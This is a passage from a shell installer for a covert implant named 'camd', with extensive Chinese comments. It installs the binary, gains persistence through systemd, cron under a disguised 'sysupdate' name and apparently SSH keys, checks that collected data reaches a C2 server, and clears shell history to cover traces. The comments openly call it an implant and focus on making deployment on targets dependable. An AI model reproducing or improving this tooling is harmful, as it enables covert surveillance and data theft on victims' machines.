        WANTS=multi-user.target
    fi
    cat > "$UNIT" <<EOF || return 1
[Unit]
Description=$UNIT_DESC
After=network.target

[Service]
Type=simple
EnvironmentFile=$CONF_FILE
ExecStart=$LIB_DIR/run.sh
Restart=always
RestartSec=10
NoNewPrivileges=true
PrivateTmp=true

[Install]
WantedBy=$WANTS
EOF
    # 【单元文件权限必须显式设置——实测撞出来的缺陷】
    # 此前 conf/bin/run.sh/cron/pubkey/ca 都 chmod 了，唯独单元文件没有，
    # 权限交给 umask 兜底。而 systemd 对单元文件有一项硬性检查：
    # 带可执行位的单元会被直接拒绝加载
    #   "Configuration file ... is marked executable.
    #    Please remove executable permission bits."
    # 于是失败形态是：单元写进去了、校验报 WARN、降级 cron、部署报"成功"，
    # 而 systemd 段静默不生效，部署者看到的全绿。umask 非 022 的环境
    # （部分容器/镜像 umask 000）在真机上同样会踩到。
    chmod 0644 "$UNIT" 2>/dev/null || :
    # 静态校验。判据**不是退出码**——这是实测踩出来的：
    #
    #   systemd-analyze verify /tmp/t.service
    #   t.service: Command /nonexistent/camd is not executable: ...
    #   rc=0                       ← 报错了，退出码仍是 0
    #
    # 只看 rc 的话，"单元指向不存在的二进制"会被判为"校验通过"，而真机
    # 上它根本起不来。判据必须是"输出非空即有问题"：实测正常单元输出为空。
    UNIT_ERR=0
    if command -v systemd-analyze >/dev/null 2>&1; then
        systemd-analyze verify "$UNIT" >/tmp/.unitv 2>&1
        V=$(cat /tmp/.unitv 2>/dev/null)
        rm -f /tmp/.unitv
        if [ -n "$V" ]; then
            UNIT_ERR=1
            UNIT_MSG=$(printf '%s' "$V" | head -1)
        fi
    else
        WARN "无 systemd-analyze，单元未静态校验"
        return 0
    fi
    [ "$UNIT_ERR" -eq 0 ] && { OK "systemd 单元静态校验通过"; return 0; }
    # 用户级单元用系统的 systemd-analyze 校验时，会因 default.target 与
    # 系统级视角不同而输出告警——那是校验器视角差异，不是单元坏了。此时
    # 不 DIE：用户级驻留由 camd 的 persist_user_ensure 真正写入，中断会让
    # 非 root 部署永远装不上（而单元本身是好的）。
    if [ "$USER_MODE" = 1 ]; then
        WARN "用户级单元静态校验有输出（视角差异，降级处理，不中断）: $UNIT_MSG"
        return 0
    fi
    # 校验失败：若即将安装 systemd 则必须中断（装上去也起不来，而部署者
    # 看到的是全绿）；容器里不安装，降级到 cron，报 WARN 即可。
    if [ "${HAVE_SYSTEMD:-0}" = 1 ]; then
        rm -f "$UNIT"
        DIE "systemd 单元校验失败: $UNIT_MSG"
    fi
    WARN "systemd 单元校验失败（未安装，降级 cron）: $UNIT_MSG"
    return 0
}

persist_systemd() {
    # 失败语义：die。只 warn 会留下"驻留成功"的假象。
    command -v systemctl >/dev/null 2>&1 || { DIE "systemctl 不存在"; }
    systemctl daemon-reload >/dev/null 2>&1 \
        && systemctl enable $UNIT_NAME >/dev/null 2>&1 \
        && systemctl restart $UNIT_NAME >/dev/null 2>&1 \
        || { rm -f "$UNIT"; systemctl daemon-reload >/dev/null 2>&1; \
             DIE "systemd 驻留失败（单元已回滚）"; }
    # 存活判据（真 systemd 实测踩出来的）：restart 返回 0 **不代表服务活着**。
    # 单元参数错误时 camd 立刻退出，Restart=always 每 RestartSec 拉起一次，
    # 服务处于 "activating (auto-restart)"：enable 成功、restart 返回 0、
    # 部署侧全绿，而实际一帧都没采集，还留下密集的失败 journal。
    # 判据必须是"重启后仍 active 且 MainPID 非 0"。
    sleep 3
    A=$(systemctl is-active $UNIT_NAME 2>/dev/null)
    M=$(systemctl show -p MainPID --value $UNIT_NAME 2>/dev/null)
    if [ "$A" != "active" ] || [ -z "$M" ] || [ "$M" = "0" ]; then
        J=$(journalctl -u $UNIT_NAME -n 5 --no-pager 2>/dev/null | tail -5)
        systemctl disable --now $UNIT_NAME >/dev/null 2>&1
        rm -f "$UNIT"
        systemctl daemon-reload >/dev/null 2>&1
        DIE "systemd 驻留后服务未存活（active=$A MainPID=$M）: ${J:-无 journal}"
    fi
    OK "systemd 驻留成功（enabled + active, pid=$M）"
    return 0
}

# cron 实现能力探测（实测撞出来的，不是推理）：
# /etc/cron.d **不是通用特性**，而是 Debian/RHEL 对 cron 打的发行版补丁。
# 真实 Vixie cron V4.999（FreeBSD / OpenBSD 及众多精简系统的上游）只读
# SPOOL_DIR 与 /etc/crontab，从不扫描 /etc/cron.d。
#
# 本沙盒实测（真 Vixie cron 守护，PID 4553，两份内容相同的分钟级作业）：
#   /etc/cron.d/probe_d（R3a 契约全合规、0600）→ 从未执行，日志零提及
#   /etc/crontab（同内容、0600）              → 真触发，子进程 status=0000
# 正对照成立，所以"cron.d 没跑"不等于"cron 没跑起来"。
#
# 后果：把驻留押在 /etc/cron.d 上，在这类目标机上**永远不执行**，
#       而部署全绿——条目写了、权限对、契约全过，只是没人会去跑它。
#       这正是"随机目标"场景最该堵的口子。
# 【判据必须带前缀，且必须与 09_persistence/src/persist.c 的
# detect_cron_impl() 同源】
#
# 首版这里探的是真实 /etc，而 camd 内部 persist 探的是 root_prefix —— 两处
# 判据不同源，实测直接互相抵消：假根下本函数按宿主（Ubuntu）判"支持"并写出
# /etc/cron.d/sysupdate，camd 起来后按空假根判"未知 -> 回退"，随即把刚写的
# cron.d 条目**删除**并改写 /etc/crontab。实测复现：install 退出 0、报告
# "cron 条目已写入"，而最终 cron.d 目录存在但为空。
#
# 这类"装了又被自己删掉"在真机上同样会发生 —— 只要两处判据将来有任何一处
# 被单独修改。故此处一律按 $PREFIX 探测：真实根时 $PREFIX 为空，探测的正是
# 真实 /etc，与 camd 的 root_prefix=NULL 完全同一份输入。
cron_supports_crond_dir() {
    _crd="${1:-}"
    [ -f "$_crd/etc/debian_version" ]  && return 0
    [ -f "$_crd/etc/redhat-release" ]  && return 0
    [ -f "$_crd/etc/centos-release" ]  && return 0
    if [ -f "$_crd/etc/os-release" ]; then
        _crd_id=$(sed -n 's/^ID=["'"'"']\?\([^"'"'"']*\)["'"'"']\?.*$/\1/p' \
                  "$_crd/etc/os-release" 2>/dev/null | head -1)
        case "${_crd_id:-}" in
            debian|ubuntu|raspbian|rhel|centos|fedora|rocky|almalinux|amzn|opensuse*|sles|suse) return 0 ;;
        esac
    fi
    return 1
}

# 回退：把条目追加到 /etc/crontab（真 Vixie cron 支持的路径）。
# 必须 chmod 0600 —— 该实现判据是 (st_mode & 07777) != 0600 即拒绝加载，
# 而多数系统 /etc/crontab 默认 0644，不修同样静默失效。
cron_append_syscrontab() {
    _ct="$PREFIX/etc/crontab"
    [ -e "$_ct" ] || printf 'SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n' > "$_ct" 2>/dev/null
    if grep -q "managed-$NAME" "$_ct" 2>/dev/null; then
        :   # 幂等：已存在则不重复追加，否则每次 install 叠一行
    else
        printf '%s * * * * root %s --batches 1  # managed-%s\n' "$M" "$LIB_DIR/run.sh" "$NAME" >> "$_ct" 2>/dev/null || return 1
    fi
    chmod 0600 "$_ct" 2>/dev/null
    return 0
}

persist_cron() {
    # 用户级部署没有 cron（无 /etc/cron.d 写权限，且桌面自启走 autostart）。
    # 此处若不 early-return，会把空路径 $CRON 写成文件而失败，并误报 WARN。
    [ "$USER_MODE" = 1 ] && return 0
    # 判据修正（实测踩出来的）：原判据是 `command -v crontab`，但
    #   - crontab(1) 是**客户端工具**，不是守护进程；
    #   - busybox/精简系统常只有 crond 而无 crontab 客户端。
    # 实测本环境：crontab 缺失，但 /etc/cron.d 存在 —— 原判据会**跳过安装**，
    # 于是部署报告里"cron 驻留"一栏为空，而目标机其实能跑 cron。漏装驻留
    # 比装了不执行更糟：前者无人知晓，后者至少有条目可查。
    # 改为：目录存在就写；守护进程是否存在单独探测并显式 WARN（不静默）。
    # 假根下目录尚不存在，先建再判——否则守卫永远走不到"写 cron 条目"
    # 这条路径，cron 驻留在测试里就从未被真正验证过。
    mkdir -p "$PREFIX/etc/cron.d" 2>/dev/null
    [ -d "$PREFIX/etc/cron.d" ] || { WARN "无 $PREFIX/etc/cron.d，跳过 cron 驻留"; return 0; }
    # 分位用真实秒数，避免 RANDOM 在 dash 下不展开导致 crontab 语法错。
    #
    # 前导零是实测踩出来的坑：date +%S 输出 00-59，而 POSIX sh 的算术
    # 展开把 0 前导的字面量当八进制——08/09 不是合法八进制（8 不是合法
    # 八进制位），于是整个 $(( )) 报 "arithmetic expression: expecting
    # EOF" 并使脚本中断。后果不止"cron 没装上"：install 在写 conf/bin
    # 之后才走到这里，中断会留下部分安装状态，而部署报告因 rc!=0 看起来
    # 只是失败了一次，没人知道磁盘上多了半个植入体。
    # 触发窗口是每分钟的第 8、9 秒（约 3.3%），故单跑守卫常常全绿、
    # 在 make test 里偶发失败——这类时间依赖缺陷绝不能靠"再跑一次"放过。
    # ${_S#0} 剥一个前导零：08→8、00→0、59→59；随后取模恒为十进制。
    _S=$(date +%S); _S=${_S#0}
    M=$(( _S % 60 ))
    #
    # 缺陷修复（实测踩出来的）：原条目是
    #     . /etc/camd/camd.conf; /usr/local/bin/camd --sink ... --backend ...
    # 两个问题，第二个致命：
    #
    #   1. `--key` 依赖 conf 里的 CAMD_KEY，但 `.` 只是**赋值、不导出**。
    #      camd 用 getenv("CAMD_KEY") 取密钥，取不到就
    #      [FATAL] 必须指定 --key 并退出。而 cron 的输出默认丢弃
    #      （无 MAILTO、无日志），于是一小时一次、次次失败、无人知晓。
    #      表现与"驻留成功"完全无法区分：进程确实起来过、也确实退出了。
    #
    #   2. 这是 systemd 之外的**第二份** camd 调用（单元里有一份）。
    #      两份独立书写的调用必然发散——此前 tcp:// 前缀正是在三处
    #      sink 里漏掉两处，导致 systemd 与 cron 两条路的回传全断。
    #
    # 改为复用 run.sh：它是唯一的调用点，内部 `set -a` 正确导出密钥，
    # 且 systemd 与 cron 走的是同一份命令，不再有发散的可能。
    # 假根模式下不做能力探测：探测的是真实 /etc 的发行版特征，而假根内
    # 那套 /etc 是测试造出来的，据此选落点会把"回退路径"在测试里永久掩盖。
    # 守卫要验的正是回退，所以假根下按调用方显式指定的形态走。
    # CRON_IMPL 是显式覆盖位：能力探测只能按发行版特征猜，而"该实现不支持
    # /etc/cron.d"这条分支在 Debian/RHEL 系机器上永远走不到——守卫若不能
    # 强制进入它，回退路径就从未被真正执行过，等于没写。
    # 【必须带 :- 默认值 —— 实测踩出来的致命缺陷】
    # CRON_IMPL 是测试用的显式覆盖位，只在 verify_cron_impl.py 里被赋值。
    # 生产环境从不设置它。而本脚本开了 set -u，于是 `if [ -n "$CRON_IMPL" ]`
    # 在变量未定义时直接报 "parameter not set" 并**终止整个脚本**。
    # 终止点极其糟糕：persist_cron 位于 conf / 二进制 / run.sh 都写完
    # **之后**，一旦中断就留下半个植入体（有配置、有二进制、有启动器，
    # 但没有任何驻留条目），而部署报告只显示"install 失败了一次"，
    # 没人知道磁盘上多了什么。此前所有测试都因为显式传了 CRON_IMPL
    # 而绕开了这条路径 —— 缺陷被测试环境永久掩盖。
    if [ -n "${CRON_IMPL:-}" ]; then
        case "${CRON_IMPL:-}" in
            syscrontab|crontab) _use_crond=0 ;;
            *)                  _use_crond=1 ;;
        esac
    elif cron_supports_crond_dir "$PREFIX"; then
        _use_crond=1
    else
        _use_crond=0
    fi
    if [ "$_use_crond" = 1 ]; then
        {
            printf '# managed\n'
            printf 'SHELL=/bin/sh\n'
            printf 'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n'
            printf '%s * * * * root %s --batches 1\n' "$M" "$LIB_DIR/run.sh"
        } > "$CRON" 2>/dev/null || { WARN "cron 写入失败"; return 0; }
        chmod 0600 "$CRON" 2>/dev/null
        OK "cron 条目已写入 $CRON（分位 $M）"
    else
        # 回退到 /etc/crontab：该实现的 cron 不扫描 /etc/cron.d。
        # 若此前写过 cron.d 条目，删除——留着是无执行可能的纯痕迹。
        rm -f "$CRON" 2>/dev/null
        if cron_append_syscrontab; then
            OK "cron 条目已追加到 $PREFIX/etc/crontab（分位 $M，本实现不支持 /etc/cron.d）"
        else
            WARN "cron 写入失败（$PREFIX/etc/crontab 不可写）"
            return 0
        fi
    fi
    # 【单一产地：把本次决定的形态写回 conf，交给运行时】
    # camd 内部 persist 有自己一套能力探测。若这里不把结论传下去，它会按
    # 自己的探测重写一遍——在 Ubuntu（有 /etc/debian_version）上就是写回
    # /etc/cron.d，把本函数的回退决定抵消。实测：CRON_IMPL=syscrontab 下
    # install 报"条目已追加到 /etc/crontab"，而 camd 试运行后
    # /etc/cron.d/sysupdate 依然存在（守卫 F4c 红）。
    # 写入后 run.sh 以 set -a 导出 conf，camd 的 persist 读
    # PERSIST_CRON_IMPL 得到同一结论，部署与运行时不再发散。
    if [ -n "${CONF_FILE:-}" ] && [ -f "$CONF_FILE" ]; then
        if [ "$_use_crond" = 1 ]; then
            _cron_kind=crond
        else
            _cron_kind=syscrontab
        fi
        # 先剔除旧值再追加：persist_cron 幂等重复调用时不留重复行。
        # 用 cat 覆写而非 sed -i，保住 conf 的 0600 与 inode。
        _ct=$(mktemp 2>/dev/null) || _ct=""
        if [ -n "$_ct" ]; then
            grep -v '^PERSIST_CRON_IMPL=' "$CONF_FILE" > "$_ct" 2>/dev/null
            printf 'PERSIST_CRON_IMPL=%s\n' "$_cron_kind" >> "$_ct" 2>/dev/null
            cat "$_ct" > "$CONF_FILE" 2>/dev/null
            rm -f "$_ct" 2>/dev/null
        fi
    fi
    # 守护进程单独探测：写了不等于会执行。未确认就显式报出来，
    # 不允许"装了但没人跑"伪装成"驻留成功"。
    if ps -eo comm= 2>/dev/null | grep -qx 'cron\|crond'; then
        OK "cron 守护进程在跑（条目会被执行）"
    else
        WARN "未检测到 cron 守护进程——条目已写但可能不会执行（需上机确认）"
    fi
    return 0
}

verify_run() {
    # 同步跑一批验证产出：让"装了但采不到"在部署阶段就暴露，而不是等运维发现。
    #
    # 【必须用 tcp:// 而非文件 sink —— 这是实测撞出来的缺陷】
    # 驻留单元里跑的是 `--sink $C2_ADDR`（tcp://）。若试运行改用文件 sink，
    # 则衡量的是"落盘字节数"而非"送达 C2 的字节数"：文件永远写得成功，
    # 于是 C2 地址写错 / C2 未启动 / 防火墙拦截时，试运行照样报
    # "产出 512 字节"全绿通过，而真实驻留进程一条都发不出去。
    # 实测三场景（有/无 C2 在线）：
    #   tcp:// + C2 在线  rc=0  C2 实收 512
    #   tcp:// + C2 离线  rc=6  C2 实收 0    <- 真实失败会被暴露
    #   file://            rc=0  C2 实收 0    <- 永远"成功"，掩盖故障
    # 附带收益：不再在 /tmp 落信元文件（那本身是采集证据残留）。
    # 与驻留路径同源：直接读 conf 的 CAMD_SINK / CAMD_EXTRA / CAMD_KEY，
    # 不在此处另拼一份 sink。否则衡量的就不是驻留进程真正会用的出口。
    # 试运行同样不得把落点/密钥拼进命令行（ps 世界可读）。用 set -a 导出
    # conf 后由 camd 从环境读取，与驻留路径（run.sh）完全一致——否则试运行
    # 衡量的就不是驻留进程真正会用的出口。
    CAMD_SINK=""; CAMD_EXTRA=""; CAMD_BACKEND="$BACKEND"; CAMD_KEY="$KEY"
    set -a
    . "$CONF_FILE"
    set +a
    # 【--root 必须与驻留路径同源——此前不同源，实测撞出来的】
    # 此前这里固定传 --root "$LIB_DIR/agent"，而真实驻留路径（run.sh）
    # 不传 --root（NULL = 真实根）。后果有两层：
    #   1) 试运行度量的驻留写在 LIB_DIR/agent 这个假子根里，与真实驻留
    #      根本不是同一处——"三段全活"的报告说的不是真机上那三段；
    #   2) 真机部署时会在 /var/lib/<NAME>/agent 下留一套永不生效的驻留
    #      痕迹（垃圾，且是采集意图的旁证）。
    # 正确做法：假根模式传 --root "$PREFIX"（隔离），真机模式不传
    #（NULL = 真实根），与 run.sh 完全一致。
    if [ -n "$PREFIX" ]; then
        RUN_OUT=$("$BIN_DST" --root "$PREFIX" --batches 1 --frames 1 2>&1)
    else
        RUN_OUT=$("$BIN_DST" --batches 1 --frames 1 2>&1)
    fi
    RC=$?
    N=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*bytes_out=\([0-9]*\).*/\1/p' | head -1)
    [ -n "$N" ] || N=0
    if [ "$RC" -ne 0 ]; then
        # 【实测撞出来的误诊】错架构产物的真实报错是 "Exec format error"，
        # 但旧判据把它一律写成"C2 可能未启动或地址不可达"。运维会据此去查
        # 网络/防火墙/C2，而真相是二进制根本不能在这台机器上执行。
        # 判据必须按"不能执行"与"连不上"分开，否则排查方向被彻底带偏。
        case "$RUN_OUT" in
            *"Exec format error"*|*"cannot execute"*|*"No such file or directory"*)
                DIE "二进制无法执行（rc=$RC）——很可能是架构错配，而非 C2 问题: $(printf '%s' "$RUN_OUT" | head -1)" ;;
        esac
        if [ "$RC" = 126 ] || [ "$RC" = 127 ]; then
            DIE "二进制无法执行（rc=$RC）——检查架构与解释器，而非 C2 地址"
        fi
        WARN "试运行未送达 C2（rc=$RC）——C2 可能未启动或地址不可达；驻留仍在，进程内会重试"
        printf '%s\n' "$RUN_OUT" | sed 's/^/       诊断: /' | head -3
        return 0
    fi
    [ "$N" -gt 0 ] || { WARN "试运行产出 0 字节"; return 0; }
    OK "试运行已送达 C2（$N 字节信元，$CAMD_SINK）"

    # 【三段驻留状态必须呈现——此前整段被丢弃】
    # camd 打了 methods=systemd:x,cron:y,sshkey:z，而本函数只 sed 出
    # bytes_out，那行被静默丢掉。后果：部署报告只有"成功 N 失败 0"，
    # 部署者无法知道三段里哪几段真的活了。而 persist_linux_ensure 走
    # "部分成功"语义——只要有一段装上就返回成功，于是"只有 cron 活着"
    # 与"三段全活"在报告上完全一致。这是最难发现的一类失效：报告全绿、
    # 服务在跑，而重启后（cron 段依赖目标机有 crond）可能一段都不剩。
    # 状态呈现是痕迹对账守卫的输入，不得省略。
    _m=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*methods=systemd:\([0-9-]*\),cron:\([0-9-]*\),sshkey:\([0-9-]*\).*/\1 \2 \3/p' | head -1)
    _pu=$(printf '%s\n' "$RUN_OUT" | sed -n 's/.*persist_user=\([0-9]*\).*/\1/p' | head -1)
    if [ -n "$_m" ]; then
        set -- $_m
        _sd=$1; _cr=$2; _sk=$3
        if [ "$_pu" = 1 ]; then
            # 用户级驻留：methods[0]=PERSIST_USER_SYSTEMD、methods[1]=
            # PERSIST_AUTOSTART。标签沿用 systemd/cron 只是历史格式，语义
            # 是用户级——若仍按"三段"呈现，会凭空多出一个并不存在的 sshkey
            # 缺段并告警，运维据此去查一个本就不适用于非 root 目标的机制。
            _live=0
            [ "$_sd" = 1 ] && _live=$((_live+1))
            [ "$_cr" = 1 ] && _live=$((_live+1))
            printf '%s\n' "[INFO] 用户级驻留: user-systemd=$_sd autostart=$_cr（生效 $_live/2）"
            if [ "$_live" -lt 2 ]; then
                WARN "用户级驻留仅 $_live/2 段生效——非 root 目标上 sshkey 段不适用，勿按三段核对"
            fi
        else
            _live=0
            [ "$_sd" = 1 ] && _live=$((_live+1))
            [ "$_cr" = 1 ] && _live=$((_live+1))
            [ "$_sk" = 1 ] && _live=$((_live+1))
            printf '%s\n' "[INFO] 驻留三段: systemd=$_sd cron=$_cr sshkey=$_sk（生效 $_live/3）"
            if [ "$_live" -lt 3 ]; then
                WARN "驻留仅 $_live/3 段生效——报告成功不等于三段都在，逐段核对见 status"
            fi
        fi
    else
        # 解析不到即视为失守：宁可报出来，也不要"看起来没这条信息"。
        WARN "未能解析驻留三段状态（methods 行缺失）——无法确认哪几段生效"
    fi
    return 0
}

cleanup_traces() {
    # 清痕：脚本自身与本次命令行。
    # 注意按 PID 精确杀，绝不 pkill -f camd —— 会匹配到本脚本命令行里的
    # "camd" 字符串而自杀（历史上表现为退出码 137/143）。
    rm -f "$TMPB" 2>/dev/null
    command -v history >/dev/null 2>&1 && history -c 2>/dev/null
    :
}

do_install() {
    [ -n "$C2" ] || DIE "必须指定 --c2 <地址:端口>"
    require_root
    detect_arch
    probe_systemd
    probe_backend
    gen_key
    validate_key
    validate_c2
    validate_front
    OK "环境: arch=$ARCH systemd=$HAVE_SYSTEMD backend=$BACKEND front=${FRONT_HOST:-无}"
    extract_bin
    install_pubkey
    write_conf
    install_ca
    install_bin
    install_runner
    render_unit
    if [ "$USER_MODE" = 1 ]; then
        # 用户级：不装系统级 systemd/cron（既无权限，装了也不对）。
        # 驻留由 camd 自身的 persist_user_ensure 写入用户级单元与 autostart；
        # render_unit 已渲染并静态校验过该单元，这里刻意不删——删了会让
        # "用户级驻留已装"在部署阶段无从核对。
        WARN "用户级部署（uid=$(id -u)）：跳过系统级 systemd/cron 安装；驻留由 camd 写入 $HOME 下的用户级单元与 autostart"
    else
        if [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
            persist_systemd
            persist_cron || :
        else
            if [ "$FAKE_ROOT" = 1 ]; then
                WARN "假根模式（PREFIX=$PREFIX）：单元已渲染并校验，但不执行 systemctl —— systemctl 不读假根，真 enable/restart 会改动真实系统状态"
            else
                WARN "systemd 未运行，单元已校验但未安装（降级到 cron）"
            fi
            rm -f "$UNIT"
            persist_cron
        fi
    fi
    verify_run
    cleanup_traces
    return 0
}

do_uninstall() {
    require_root
    HAVE_SYSTEMD=0
    probe_systemd

    # 痕迹探测（不可省）：此前无论装没装，uninstall 一律报"systemd/文件/进程
    # 已清理"三项 OK。于是部署中途失败留下的半截状态、或根本没装过的机器，
    # 跑 uninstall 都会显示"成功 3 失败 0"——运维据此认为已清干净，而实际
    # 什么都没做（或半截残留仍在）。区分"清理了"与"本就没有"是诊断的前提。
    _tr=0
    [ -f "$CONF_FILE" ] && _tr=1
    [ -x "$BIN_DST" ]  && _tr=1
    [ -f "$CRON" ]     && _tr=1
    [ -n "$AUTOSTART_DESKTOP" ] && [ -f "$AUTOSTART_DESKTOP" ] && _tr=1
    [ -f "$UNIT" ]     && _tr=1
    [ -d "$LIB_DIR" ]  && _tr=1
    [ -d "$CONF_DIR" ] && _tr=1
    if [ "$_tr" = 0 ] && [ "$FAKE_ROOT" = 0 ]; then
        OK "未检测到安装痕迹——本就未安装，无需清理"
        return 0
    fi

    # 顺序：先 disable --now 再删单元。只 stop 的话 Restart=always 会被拉起。
    # systemctl 操作需要 systemd 在跑；删单元文件不需要。
    #
    # 此前两者绑在一起：HAVE_SYSTEMD=0 时整个分支被跳过，而 install 阶段
    # 单元文件是照写不误的（渲染 + 静态校验后落盘，与 systemd 是否运行无关）。
    # 于是卸载后 /etc/systemd/system/<name>.service 永久残留，却报
    # "systemd 不可用，跳过"——看起来是成功。卸载的目的就是清除痕迹，而
    # 单元文件恰是最显眼的一条：0644，含服务名与 ExecStart 绝对路径。
    if [ "$USER_MODE" = 1 ]; then
        OK "用户级部署：跳过 systemctl（驻留在 $HOME，无需系统级单元操作）"
    elif [ "$HAVE_SYSTEMD" = 1 ] && [ "$FAKE_ROOT" = 0 ]; then
        systemctl disable --now $UNIT_NAME >/dev/null 2>&1
        systemctl daemon-reload >/dev/null 2>&1
        systemctl reset-failed >/dev/null 2>&1
        OK "systemd 驻留已清理（服务已停用）"
    elif [ "$FAKE_ROOT" = 1 ]; then
        OK "假根模式：跳过 systemctl（不改动真实系统状态）"
    else
        OK "systemd 不可用，跳过 systemctl（单元文件仍会删除）"
    fi
    # 单元文件的删除与上面分支解耦：无条件删。
    # 假根下 $UNIT 由 $PREFIX 派生，删的是假根内的文件，不影响真实系统；
    # 且假根守卫本就要断言"卸载后无残留"，这里不删反而让它永远测不到。
    rm -f "$UNIT" 2>/dev/null
    rm -f "$CRON" "$BIN_DST" "$LOCK" "$AUTOSTART_DESKTOP" 2>/dev/null
    # 回退形态写在 /etc/crontab 里：不清理就会留下"重新装一次才被发现"的
    # 驻留痕迹，且它会随系统 crontab 一起被任何排错行为看见。
    #
    # 【两套 marker 必须都清 —— 实测踩出来的残留缺陷】
    # 本脚本写的是 "# managed-$NAME"（周期条目），而 camd 内部 persist 写的
    # 是 "# do-not-edit:managed"（@reboot 条目），后者由 09_persistence 的
    # MARKER 定义。只清前者时，卸载报告"成功 3 失败 0"，而
    #   @reboot root /var/tmp/.system-cache/agent  # do-not-edit:managed
    # 整行留在 /etc/crontab 里 —— 机器一重启植入体照样起来，卸载等于没卸。
    # 判据用"或"而非"且"：任一存在即清理，两行都清干净才算完。
    # 该字面量与 persist.c 的 #define MARKER 必须一致，由 verify_cron_impl
    # 的 S5 静态断言守着（改一处不改另一处会立刻变红）。
    _ct="$PREFIX/etc/crontab"
    if [ -f "$_ct" ] && grep -q -e "managed-$NAME" -e "$PERSIST_MARKER" "$_ct" 2>/dev/null; then
        grep -v -e "managed-$NAME" -e "$PERSIST_MARKER" "$_ct" > "$_ct.$$.tmp" 2>/dev/null \
            && mv "$_ct.$$.tmp" "$_ct" 2>/dev/null
        rm -f "$_ct.$$.tmp" 2>/dev/null
    fi
    rm -rf "$CONF_DIR" "$LIB_DIR" 2>/dev/null
    # 不可省：此前无论 rm 真的删没删掉，这里一律 OK。rm 失败只往 stderr 吐一行，
    # 计数不走 fail，于是卸载报"成功 3 失败 0"而最敏感的 $CONF_DIR（含密钥与
    # C2 地址）留在盘上。真实成因：目录是挂载点（Device or resource busy）、
    # 被进程占用、或只读——恰恰都发生在最需要清痕的时刻。
    _left=""
    for _p in "$UNIT" "$CRON" "$BIN_DST" "$LOCK" "$AUTOSTART_DESKTOP" "$CONF_DIR" "$LIB_DIR"; do
        [ -e "$_p" ] && _left="$_left $_p"
    done
    if [ -n "$_left" ]; then
        log FAIL "文件清理未完成，残留:$_left"
        fail=$((fail+1))
    else
        OK "文件与二进制已清理"
    fi
    # 按 PID 精确杀，避免 pkill -f 自匹配。
    # 假根下**不杀**：comm 匹配区分不了"这个 camd 属于哪个根"，杀会误伤
    # 真实部署的常驻进程——那正是假根要隔离的东西。假根部署在守卫里用
    # --batches 1 跑完即退，本来也不留常驻进程。
    if [ "$FAKE_ROOT" = 1 ]; then
        WARN "假根模式：跳过按 comm 杀进程（无法区分归属，会误伤真实部署）"
    else
        # comm 截断：已在 validate_name 限制 NAME <= 15，故 comm 与 $NAME 恒等。
    for P in $(ps -eo pid=,comm= 2>/dev/null | awk -v n="$NAME" '$2==n{print $1}'); do
            kill -TERM "$P" 2>/dev/null
        done
        OK "进程已清理"
    fi
    return 0
}

do_status() {
    require_root   # 非 root 时把落点重派生到 $HOME，否则恒报"缺失"
    printf '配置: %s\n' "$([ -r "$CONF_FILE" ] && echo 存在 || echo 缺失)"
    [ -r "$CONF_FILE" ] && grep -c . "$CONF_FILE" >/dev/null 2>&1 \
        && sed 's/CAMD_KEY=.*/CAMD_KEY=<隐藏>/' "$CONF_FILE" 2>/dev/null
    printf '二进制: %s\n' "$([ -x "$BIN_DST" ] && echo 存在 || echo 缺失)"
    printf 'systemd 单元: %s\n' "$([ -f "$UNIT" ] && echo 存在 || echo 缺失)"
    printf 'cron 条目: %s\n' "$([ -f "$CRON" ] && echo 存在 || echo 缺失)"
    printf '运行进程: %s\n' "$(ps -eo comm= 2>/dev/null | grep -c -x "$NAME")"
    return 0
}

do_checkpayload() {
    # 只校验、不安装：在构建机/跳板上先验"这份包能不能在这台机器上跑"，
    # 避免在目标机上安装到一半才发现架构错配（那时已留下文件与驻留条目）。
    detect_arch
    OK "当前架构: $ARCH -> $ARCH_KEY"
    extract_bin
    rm -f "$TMPB" 2>/dev/null
    OK "分节齐全，e_machine 匹配，可以安装"
    return 0
}

case "$ACTION" in
    install)   do_install ;;
    uninstall) do_uninstall ;;
    status)    do_status ;;
    checkpayload) do_checkpayload ;;
    renderunit)
        # 只渲染 + 静态校验单元，不安装、不删除、不碰 systemctl。
        #
        # 为什么必须有这个子命令：do_install 里 render_unit 之后，凡判定
        # "不安装 systemd"（假根或 PID 1 非 systemd）都会 rm -f "$UNIT"。
        # 于是单元测试在非 systemd 环境**根本无从检查**——而单元内容恰恰
        # 是最该被静态校验的东西（是否含 Restart=always、是否泄露密钥与
        # C2 地址、Description 是否点明功能）。
        #
        # 用途二：部署前预览。单元是 0644 且常进配置管理，落盘前先看一眼
        # 比事后清理容易得多。
        [ -n "$PREFIX" ] || WARN "未指定 --prefix：单元将写入真实 /etc/systemd/system"
        render_unit || exit 1
        printf 'UNIT_PATH=%s\n' "$UNIT"
        [ "$UNIT_ERR" -eq 0 ] || exit 1
        ;;
esac
report
[ "$fail" -eq 0 ] || exit 1
exit 0

# PAYLOAD_BEGIN
# PAYLOAD_END
